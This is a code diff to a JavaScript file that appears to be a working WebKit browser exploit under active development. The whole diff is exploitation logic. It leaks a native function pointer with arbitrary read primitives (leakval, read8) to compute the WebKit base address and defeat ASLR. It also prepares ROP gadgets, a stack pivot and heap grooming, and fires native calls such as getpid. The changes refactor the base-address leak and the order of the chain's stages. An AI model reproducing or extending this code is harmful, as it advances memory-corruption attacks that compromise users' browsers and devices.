@@ -90,15 +90,22 @@ import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831l";
+const BUILD_ID = "rw-20250831m";
 
 function usePoopsNativePath() {
     return params.get("nativepath") === "poops";
 }
 
+function useCoreNativePath() {
+    return params.get("nativepath") === "core" || params.get("nativepath") === "parseint";
+}
+
+/** Heavy native slab @ Start only when requested — 2e Leak+lk must stay lightweight. */
+function nativePrepAtStart() {
+    return params.get("nativeprep") === "1";
+}
+
 function pivotBuiltinFromParams() {
-    if (!usePoopsNativePath())
-        return { fn: parseInt, name: "parseint-core" };
     try {
         return resolvePivotBuiltin(params.get("pivotfn") || "expm1");
     } catch (e) {
@@ -1018,9 +1025,7 @@ async function runVtable2eLk() {
     if (!ready || !window.p || busy) return false;
     const p = window.p;
     const off = loadEffectiveOff();
-    let webkitBase = basesFromSession(off).webkitBase;
-    if (!webkitBase && nativePrep && nativePrep.webkitBase)
-        webkitBase = nativePrep.webkitBase;
+    let webkitBase = chainWebkitBase(off);
     if (!webkitBase) {
         mark("LK-SKIP", "no webkitBase — Start first");
         state("Start first", "bad");
@@ -1076,7 +1081,7 @@ async function runScanExtToLk() {
     if (!ready || !window.p || busy) return false;
     const p = window.p;
     const off = loadEffectiveOff();
-    const { webkitBase } = basesFromSession(off);
+    const { webkitBase } = { webkitBase: chainWebkitBase(off) };
     if (!webkitBase) {
         mark("LK-SKIP", "no webkitBase — Start + Save bases first");
         state("Start first", "bad");
@@ -1427,31 +1432,35 @@ function saveBasesManual() {
     busy = true;
     setUi();
     try {
-        const p = window.p;
-        const off = loadEffectiveOff();
-        const cell = p.leakval(Math.expm1);
-        const nativeFn = p.read8(p.read8(cell.add32(0x18))
-            .add32(off.wk_JSFunction_m_function || 0x28));
-        if (!nativeFn) {
-            mark("SAVE-FAIL", "nativeFn capture failed");
-            return;
-        }
-        const webkitBase = (nativeFn && off.wk_expm1_builtin)
-            ? nativeFn.sub32(off.wk_expm1_builtin)
-            : resolveWebkitBase(off, nativeFn);
-        if (webkitBase) {
-            persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
-            mark("SAVE-OK", "nativeFn=" + nativeFn + " webkitBase=" + webkitBase);
+        const wb = persistWebkitBasesLight(window.p, loadEffectiveOff());
+        if (wb) {
+            mark("SAVE-OK", "nativeFn session updated wb=" + wb);
             mark("SAVE-HINT", "cal/index_rw share session — open index_cal after this");
+            state("bases saved — tap gadget buttons", "ok");
         } else {
-            persistSessionBases(nativeFn, null);
-            mark("SAVE-OK", "nativeFn=" + nativeFn + " (no expm1 for base)");
+            mark("SAVE-FAIL", "nativeFn capture failed");
         }
-        state("bases saved — tap gadget buttons", "ok");
     } finally {
         busy = false;
         setUi();
     }
+}
+
+/** expm1 → webkitBase for 2e Leak+lk — no native slab, no extra allocations. */
+function persistWebkitBasesLight(p, off) {
+    if (!p || !off) return null;
+    const cell = p.leakval(Math.expm1);
+    const nativeFn = p.read8(p.read8(cell.add32(0x18))
+        .add32(off.wk_JSFunction_m_function || 0x28));
+    if (!nativeFn) return null;
+    const webkitBase = off.wk_expm1_builtin
+        ? nativeFn.sub32(off.wk_expm1_builtin)
+        : resolveWebkitBase(off, nativeFn);
+    if (webkitBase)
+        persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
+    else
+        persistSessionBases(nativeFn, null);
+    return webkitBase;
 }
 
 function gadgetBytesHex(p, base, rva, n) {
@@ -4429,13 +4438,13 @@ async function loadNotifySk() {
     return notifySkModule;
 }
 
-/** Capture mainMf — default: slopkit-core carrier (parseInt). ?nativepath=poops for legacy expm1. */
+/** Capture mainMf — ?nativepath=core for parseInt+textarea; poops for expm1 legacy. */
 function ensureNativePrep(p, off) {
     if (nativePrep) return nativePrep;
     const carrier = window._wkCarrier;
     const hookMode = pivotHookMode();
 
-    if (!usePoopsNativePath() && carrier) {
+    if (useCoreNativePath() && carrier) {
         try {
             nativePrep = prepCoreNative(p, off, carrier);
             nativePrep._pinMainMf = nativePrep.mainMf;
@@ -4454,7 +4463,9 @@ function ensureNativePrep(p, off) {
         }
     }
 
-    const pivot = pivotBuiltinFromParams();
+    const pivot = usePoopsNativePath()
+        ? pivotBuiltinFromParams()
+        : resolvePivotBuiltin("expm1");
     const cap = captureMainMfForPrep(p, off, pivot.fn);
     cap.pivotTrigger = pivot.fn;
     cap.pivotBuiltinName = pivot.name;
@@ -5739,38 +5750,51 @@ async function runStart() {
         pivotReady = true;
         const off = loadEffectiveOff();
         const nm = getNativeMode();
+
         try {
-            ensureNativePrep(p, off);
-            mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + nm);
-            mark("PREP-PIN", "bisect N0 or N2→N5 skip N1 — hook=" + pivotHookMode()
-                + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
-            if (params.get("smoke") === "1" && nativeAllowed && nm === "smoke") {
-                mark("SMOKE-NOW", "atomic smoke @ PRIMITIVE-OK (?smoke=1)");
-                renderOut();
-                try {
-                    firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
-                    mark("NATIVE-OK", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
-                    state("pivot smoke OK @ Start", "ok");
-                } catch (smokeErr) {
-                    mark("NATIVE-FAIL", "smoke @ Start: " + (smokeErr.message || smokeErr));
+            const wb = persistWebkitBasesLight(p, off);
+            if (wb)
+                mark("WEBKIT-BASE", "saved for 2e wb=" + wb);
+        } catch (wbErr) {
+            mark("WEBKIT-BASE-WARN", wbErr.message || String(wbErr));
+        }
+
+        if (nativePrepAtStart()) {
+            try {
+                ensureNativePrep(p, off);
+                mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + nm);
+                mark("PREP-PIN", "bisect N0 or N2→N5 skip N1 — hook=" + pivotHookMode()
+                    + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
+                if (params.get("smoke") === "1" && nativeAllowed && nm === "smoke") {
+                    mark("SMOKE-NOW", "atomic smoke @ PRIMITIVE-OK (?smoke=1)");
+                    renderOut();
+                    try {
+                        firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
+                        mark("NATIVE-OK", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
+                        state("pivot smoke OK @ Start", "ok");
+                    } catch (smokeErr) {
+                        mark("NATIVE-FAIL", "smoke @ Start: " + (smokeErr.message || smokeErr));
+                    }
+                } else {
+                    tryNativeFireAtStart(p, off);
                 }
-            } else {
-                tryNativeFireAtStart(p, off);
+            } catch (prepErr) {
+                mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
             }
-        } catch (prepErr) {
-            mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
+        } else {
+            mark("NATIVE-HINT", "slab deferred — 2e Leak+lk first. Bisect/Fire preps slab (?nativeprep=1)");
         }
         renderOut();
         const nmHint = getNativeMode();
         if (nmHint === "notify") {
-            mark("HINT", "notify = expm1 ROP (same as getpid). Verify pivot → Accept fn → Fire");
-            state("primitive OK — Accept fn → Fire notify", "ok");
+            mark("HINT", "Start → 2e Leak+lk → Accept fn → Fire notify (?nativepath=poops default)");
+            state("primitive OK — 2e Leak+lk", "ok");
         } else if (nmHint === "smoke" || nmHint === "getpid") {
-            mark("HINT", "PREP-PIN @ Start — skip N1, Verify pivot, bisect N2→N0");
-            state("primitive OK — Accept fn → bisect or Fire", "ok");
+            mark("HINT", "Start → 2e Leak+lk → Accept fn → bisect N5a or Fire");
+            state("primitive OK — 2e Leak+lk", "ok");
         } else {
-            mark("HINT", "set native mode (notify/smoke/getpid) then Accept fn");
-            state("primitive OK", "ok");
+            mark("HINT", "Start → 2e Leak+lk. Core native: ?nativepath=core");
+            state("primitive OK — 2e Leak+lk", "ok");
         }
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
@@ -6010,7 +6034,7 @@ function init() {
     else crashLog.restoreInto(lines);
 
     crashLog.startAutoFlush();
-    mark("BOOT", "build=" + BUILD_ID + " — logs persist across reload/crash");
+    mark("BOOT", "build=" + BUILD_ID + " — Start → 2e Leak+lk → Accept fn → Fire");
     const np = params.get("notifysmoke");
     const nb = params.get("notifybisect");
     const ngd = params.get("gd");
@@ -6032,7 +6056,7 @@ function init() {
     wireGroomBar(() => busy);
     setUi();
     renderOut();
-    state("Start → 2e lk → Fire notify", "");
+    state("Start → 2e Leak+lk → Fire", "");
 }
 
 function bootUi() {
